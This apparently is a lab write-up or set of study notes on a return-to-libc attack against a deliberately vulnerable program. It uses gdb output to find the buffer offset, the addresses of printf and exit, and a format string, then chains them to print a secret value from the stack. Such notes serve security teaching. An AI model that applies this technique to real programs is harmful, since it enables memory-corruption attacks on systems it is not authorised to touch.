# Return to libc

Return to libc requires an additional flag `-fno-stack-protector` when compiling.

## Creating the stack frame for libc

We want to place the address of a libc function below $ebp, at the return address, such that the libc instruction is loaded into $eip after the return address is consumed.

When the libc instruction is executed, we need to convince the libc function that it was called regularly.

```
|      buffer      |
|       ...        |
|     old ebp      |
|   return addr    | <- &libc
|      arg0        | <- fake return addr
|      arg1        | <- arg0
```

# vul

## Debugging

### Offset between &buffer and $ebp

We first need to get &buffer and $ebp to determine how much padding we need to reach the bottom of the stack frame.

```
print &buf
> 0xffffd350
print $ebp
> 0xffffd3a8
```

`$ebp -  &buffer = 88`. Therefore, we need an 88-byte padding.

### Address of printf

```
print &printf
> 0xf7e39c60
```

### Fake return address

We can use either `main` or `exit` to exit the program after the libc function returns.

```
print &exit
> 0xf7e19060
```

### Format string address

We can search libc for instances of "%s".

```
info proc map
> <displays all mapped memory address spaces in the current context>

find <start_addr>, <end_addr>, "<pattern>"
> <list of addresses with "<pattern>" value>
```

Then, we can use any of these addresses as the first argument for the format string.

#### No pattern found

If the pattern cannot be found, we will have to write the value ourselves. For `printf`, we can target the memory address 1 word below the current address, or 5 words below $ebp, then write our format string to that location.

`$ebp + 5 words = 0xffffd3bc`

* We should not write our data above because the null byte at the end of the format string will stop our attack.

### Address of secret

```
info stack
> <list of stack frames>
frame 1
> #1 0x080485a5 in main () at vul.c:18
print &secret
> 0xffffd443
```

### Format string contents

Lastly, we are at the address `$ebp + 5 words`. We simply have to write our format string.

```
"%s\n"
```

